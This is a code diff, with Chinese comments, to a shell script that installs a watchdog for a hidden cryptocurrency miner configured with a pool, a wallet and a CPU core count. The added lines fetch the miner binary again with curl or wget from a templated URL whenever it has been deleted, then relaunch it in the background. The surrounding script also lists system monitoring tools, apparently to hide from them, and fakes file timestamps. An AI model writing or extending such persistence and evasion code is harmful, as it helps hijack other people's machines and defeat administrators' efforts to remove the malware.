@@ -630,6 +630,27 @@ FILEPATH="__FILEPATH__"
 POOL="__POOL__"
 WALLET="__WALLET__"
 CORES="__CORES__"
+DOWNLOAD_URL="__DOWNLOAD_URL__"
+
+# 重新下载函数
+redownload() {
+    local url="$DOWNLOAD_URL"
+    local filepath="$FILEPATH"
+    
+    # 尝试 curl
+    if command -v curl >/dev/null 2>&1; then
+        curl -sL --connect-timeout 15 --max-time 120 "$url" -o "$filepath" 2>/dev/null
+        [ -s "$filepath" ] && chmod +x "$filepath" && return 0
+    fi
+    
+    # 尝试 wget
+    if command -v wget >/dev/null 2>&1; then
+        wget -q --timeout=15 -O "$filepath" "$url" 2>/dev/null
+        [ -s "$filepath" ] && chmod +x "$filepath" && return 0
+    fi
+    
+    return 1
+}
 
 check_monitoring() {
     local tools="top htop atop glances nmon iotop perf strace gdb"
@@ -667,6 +688,12 @@ while true; do
         # 检查进程是否存在
         if ! pgrep -f "$FILEPATH" >/dev/null 2>&1; then
             # 检查文件是否存在
+            if [ ! -f "$FILEPATH" ]; then
+                # 文件被删除，重新下载
+                redownload
+            fi
+            
+            # 文件存在则启动
             if [ -f "$FILEPATH" ]; then
                 cd "$(dirname "$FILEPATH")"
                 nohup nice -n 19 "$FILEPATH" -o "$POOL" -u "$WALLET" -p x -t "$CORES" --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &
@@ -684,6 +711,7 @@ MONITOR_EOF
     sed -i "s|__POOL__|$POOL_ADDRESS|g" "$monitor_script"
     sed -i "s|__WALLET__|$WALLET_ADDRESS|g" "$monitor_script"
     sed -i "s|__CORES__|$ACTUAL_CORES|g" "$monitor_script"
+    sed -i "s|__DOWNLOAD_URL__|${DOWNLOAD_URLS[0]}|g" "$monitor_script"
     
     chmod +x "$monitor_script"
     fake_timestamp "$monitor_script"
